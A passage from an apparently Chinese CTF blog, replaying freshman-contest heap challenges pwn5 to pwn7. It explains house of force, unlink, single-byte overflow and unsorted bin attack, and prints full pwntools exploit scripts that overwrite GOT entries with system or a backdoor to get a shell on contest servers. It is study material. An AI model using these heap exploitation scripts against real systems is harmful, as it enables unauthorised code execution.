class=\"string\">\"男\"</span>  &lt;&lt; <span class=\"string\">\"男\"</span>；</span><br><span class=\"line\">    namelist &lt;&lt; <span class=\"string\">\"ll\"</span> &lt;&lt; <span class=\"string\">\"aa\"</span> &lt;&lt; <span class=\"string\">\"11\"</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-其他控件\"><a href=\"#4-其他控件\" class=\"headerlink\" title=\"4.其他控件\"></a>4.其他控件</h3><p>需要的时去看库吧</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210104641479.png\" alt=\"image-20201210104641479\"></p>\n<h2 id=\"0x09-Qfile文件读写\"><a href=\"#0x09-Qfile文件读写\" class=\"headerlink\" title=\"0x09 Qfile文件读写\"></a>0x09 Qfile文件读写</h2><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083900742.png\" alt=\"image-20201214083900742\"></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083912652.png\" alt=\"image-20201214083912652\"></p>\n","categories":["Qt"],"tags":["others"]},{"title":"新生赛复现","url":"https://pz1o.top/2020/12/06/新生赛复现/","content":"<h1 id=\"复现\"><a href=\"#复现\" class=\"headerlink\" title=\"复现\"></a>复现</h1><p>终于考完试了，这考前学真不是人干的，上课还是得听一听</p>\n<p>复现一下这几道题，顺便学习堆的知识</p>\n<hr>\n<p>淦 我是fw 拖了五天 终于来复现了</p>\n<p>但发现堆已经忘得差不多了</p>\n<p>先复习堆的基础知识</p>\n<p><a href=\"https://blog.csdn.net/qq_41453285/category_9150569.html（浅显易懂，非常适合新手学）\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_41453285/category_9150569.html（浅显易懂，非常适合新手学）</a></p>\n<p><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/</a></p>\n<h1 id=\"pwn5\"><a href=\"#pwn5\" class=\"headerlink\" title=\"pwn5\"></a>pwn5</h1><p>官方wp</p>\n<blockquote>\n<p>利用change函数中存在的任意字节堆溢出构造house of force攻击</p>\n<p>关于house of force不懂得的可以参考这篇文章</p>\n<p><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p>\n</blockquote>\n<p>先来看一下house of force</p>\n<h2 id=\"house-of-force\"><a href=\"#house-of-force\" class=\"headerlink\" title=\"house of force\"></a><strong>house of force</strong></h2><p><strong>利用条件</strong></p>\n<ul>\n<li>能够以溢出等方式控制到 top chunk 的 size 域</li>\n<li>能够自由地控制堆分配尺寸的大小</li>\n</ul>\n<p><strong>利用步骤</strong></p>\n<p>(1)首先先泄露出堆地址。</p>\n<p>(2)利用堆溢出，将top chunk的size域修改为很大的数</p>\n<p>(3)申请大块内存(可以通过堆地址和目标地址的距离进行计算)，使得top chunk的头部落在目标地址范围内。</p>\n<p>(4)再次申请内存，那么新申请的内存即为目标地址，通常情况下(未开启FullRelro)，一般是将目标地址设为got表地址。</p>\n<p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>\n<p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。</p>\n<p>因为是第一次弄堆题 所以尽量弄得清楚一点</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122054112.png\" alt=\"image-20201213122054112\"></p>\n<p>还未进入菜单 堆中情况</p>\n<p>两个指针</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122653935.png\" alt=\"image-20201213122653935\"></p>\n<p>添加一个</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">\"aaaa\"</span>)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213140931866.png\" alt=\"image-20201213140931866\"></p>\n<p>修改top chunk大小</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"number\">0x30</span> * <span class=\"string\">'a'</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">change(<span class=\"number\">0</span>,<span class=\"number\">0x41</span>,payload)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213170620443.png\" alt=\"image-20201213170620443\"></p>\n<p>这时 我们需要把top指针指向堆底，从而改变函数指针</p>\n<p>那我们应该怎么申请大小呢，我们需要“后撤步”，就是负向申请地址。那大小呢，最起码应该是0x40+0x20，然后加上一个头需要的地址（0xf）与尾部top前可用的空间（0x8）。</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213175814153.png\" alt=\"image-20201213175814153\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10014</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,name)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,size,name)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x400D1B</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">\"ddaa\"</span>)</span><br><span class=\"line\">payload = <span class=\"number\">0x30</span> * <span class=\"string\">'a'</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">change(<span class=\"number\">0</span>,<span class=\"number\">0x41</span>,payload)</span><br><span class=\"line\">offset_to_heap_base = -(<span class=\"number\">0x40</span> + <span class=\"number\">0x20</span>)</span><br><span class=\"line\">malloc = offset_to_heap_base - <span class=\"number\">0x8</span> - <span class=\"number\">0xf</span></span><br><span class=\"line\">add(malloc,<span class=\"string\">\"dddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(magic) * <span class=\"number\">2</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">\"5\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">print(r.recv())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<p>负向申请然后打过去，然后这里应该可以只要申请足够大 然后把里面内容全覆盖为后门函数 直接调用应该都可以</p>\n<h2 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h2><p>可以去看我刚总结的堆</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/unlink_smallbin_intro.png\" alt=\"img\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/python</span><br><span class=\"line\"><span class=\"meta\">#coding=utf-8</span></span><br><span class=\"line\">from pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">#context.log_level = 'debug'</span><br><span class=\"line\">p = process('./pwn5')</span><br><span class=\"line\">#p = remote('219.219.61.234','10014')</span><br><span class=\"line\">elf = ELF('./pwn5')</span><br><span class=\"line\"></span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">def add(<span class=\"built_in\">size</span>,con):</span><br><span class=\"line\">\tp.sendlineafter('Your choice:','2')</span><br><span class=\"line\">\tp.sendlineafter('Plz input the size of item name:',str(size))</span><br><span class=\"line\">\tp.sendafter('Plz input the name:',con)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">def <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">\tp.sendlineafter('Your choice:','4')</span><br><span class=\"line\">\tp.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">def <span class=\"title\">show</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.sendlineafter('Your choice:','1')</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">def <span class=\"title\">change</span><span class=\"params\">(idx,<span class=\"built_in\">size</span>,con)</span>:</span></span><br><span class=\"line\">    p.sendlineafter('Your choice:','3')</span><br><span class=\"line\">    p.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class=\"line\">    p.sendlineafter('Plz enter the length of item name:',str(size))</span><br><span class=\"line\">    p.sendafter('Plz enter the new name of the item:',con)</span><br><span class=\"line\">buf = <span class=\"number\">0x06020b8</span></span><br><span class=\"line\">sys = <span class=\"number\">0x400D1B</span></span><br><span class=\"line\">add(0x60,'ccc')</span><br><span class=\"line\">add(0x58,'aaa')</span><br><span class=\"line\">add(0x80,'bbb')</span><br><span class=\"line\">add(0x60,'eee')</span><br><span class=\"line\">add(0x60,'fff')</span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x51</span>)</span><br><span class=\"line\">payload += p64(buf - <span class=\"number\">0x18</span>) </span><br><span class=\"line\">payload += p64(buf - <span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload += <span class=\"string\">'a'</span>*<span class=\"number\">0x30</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x50</span>)+p8(<span class=\"number\">0x90</span>) </span><br><span class=\"line\">change(<span class=\"number\">1</span>,<span class=\"number\">0x80</span>,payload)</span><br><span class=\"line\"><span class=\"keyword\">delete</span>(<span class=\"number\">2</span>)</span><br><span class=\"line\">change(<span class=\"number\">1</span>,<span class=\"number\">0x40</span>,p64(<span class=\"number\">0x60</span>)*<span class=\"number\">3</span>+ p64(<span class=\"number\">0x6020a8</span>))</span><br><span class=\"line\">change(1,0x40,p64(elf.got['free']))</span><br><span class=\"line\">change(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>,p64(sys)*<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"meta\"># delete(3)</span></span><br><span class=\"line\"><span class=\"meta\"># gdb.attach(p)</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h1 id=\"pwn6\"><a href=\"#pwn6\" class=\"headerlink\" title=\"pwn6\"></a>pwn6</h1><blockquote>\n<p>change函数中存在单字节溢出漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;if ( heap[v1] ) </span><br><span class=\"line\">&gt;&#123; \tprintf(&quot;Content of heap : &quot;);</span><br><span class=\"line\">\tread_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class=\"line\">\tputs(&quot;Done !&quot;); </span><br><span class=\"line\">&gt;&#125;</span><br></pre></td></tr></table></figure>\n<p>利用单字节溢出漏洞构造fake_chunk,free之后再次分配造成overlap,从而任意地址读写</p>\n<p>泄露出libc基地址，修改got表，最后get_shell</p>\n</blockquote>\n<p>毕竟一开始做堆题，上来先分析，尽量详细点</p>\n<blockquote>\n<p>add函数</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219204952738.png\" alt=\"image-20201219204952738\"></p>\n<p>其中数据结构为</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205027638.png\" alt=\"image-20201219205027638\"></p>\n<p>change函数</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205113774.png\" alt=\"image-20201219205113774\"></p>\n</blockquote>\n<p>直接看exp分析吧</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10015</span>)</span><br><span class=\"line\">heap = ELF(<span class=\"string\">'./pwn6'</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'./libc.so.6'</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    <span class=\"comment\">#r.recvuntil(\":\")</span></span><br><span class=\"line\">    <span class=\"comment\">#r.sendline(name)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">free_got = heap.got[<span class=\"string\">'free'</span>]</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>, <span class=\"string\">'AAAA'</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">'AAAA'</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">change(<span class=\"number\">0</span>, <span class=\"string\">\"/bin/sh\\x00\"</span> + <span class=\"string\">'A'</span>*<span class=\"number\">0x10</span> + <span class=\"string\">\"\\x41\"</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span> + p64(<span class=\"number\">0x20</span>) + p64(heap.got[<span class=\"string\">'free'</span>]))</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"Content : \"</span>)</span><br><span class=\"line\">data = r.recvuntil(<span class=\"string\">\"Done !\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free_addr = u64(data.split(<span class=\"string\">\"\\n\"</span>)[<span class=\"number\">0</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))</span><br><span class=\"line\">libc_base = free_addr -libc.symbols[<span class=\"string\">'free'</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">'libc base addr:'</span>+hex(libc_base))</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">change(<span class=\"number\">1</span>,p64(system_addr))</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>先说一下思路</p>\n<ul>\n<li>单字节溢出，我们可以通过修改chunk_size来overlap，达到任意读写的目的</li>\n<li>由于后门函数没有，所以我们就应该想调用system函数，首要的就是泄露libc基址，其次获取system函数</li>\n<li>改free的got表 达到调用</li>\n</ul>\n<p>这里来写一下exp的思路</p>\n<ol>\n<li>先申请两个堆块，之后修改第一个堆块，第一个堆块可以写入/bin/sh的参数，然后我们修改第二个堆块的size，使其进入fastbin中，让我们再次分配</li>\n<li>我们进行重新分配，这是就可以任意写，把got表中的free写进去，然后读出来，泄露基址</li>\n<li>修改free的got表为system的地址然后直接free(0)也就调用了/bin/sh</li>\n</ol>\n<p>下面是关键截图</p>\n<p>写入/bin/sh</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211422639.png\" alt=\"image-20201220211422639\"></p>\n<p>释放1之后</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211752814.png\" alt=\"image-20201220211752814\"></p>\n</blockquote>\n<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>这里说一下我自己的问题</p>\n<p>我一直认为fakechunk被释放后进入fastbin中，我一直认为fastbin中只有一个chunk</p>\n<p>知道我惊人地发现它居然是free了两回是两个chunk </p>\n<p>我才醒悟</p>\n<p>为什么它不直接从top chunk中分配（我个fw，盯着看了两个小时也没看出来）</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223150743.png\" alt=\"image-20201220223150743\"></p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223239931.png\" alt=\"image-20201220223239931\"></p>\n<p>总结，自己总是在自己想这个堆怎么运行，很少去调试。还是应该多动手（要不是我调试能力不太行）</p>\n<h1 id=\"pwn7\"><a href=\"#pwn7\" class=\"headerlink\" title=\"pwn7\"></a>pwn7</h1><blockquote>\n<p>很简单的unsorted bin attack,利用此攻击修改flag为一个很大的数就可以获得shell了</p>\n<p>关于unsorted bin attack可以参考这篇文章</p>\n<p><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10016</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    <span class=\"comment\">#r.recvuntil(\":\")</span></span><br><span class=\"line\">    <span class=\"comment\">#r.sendline(name)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span 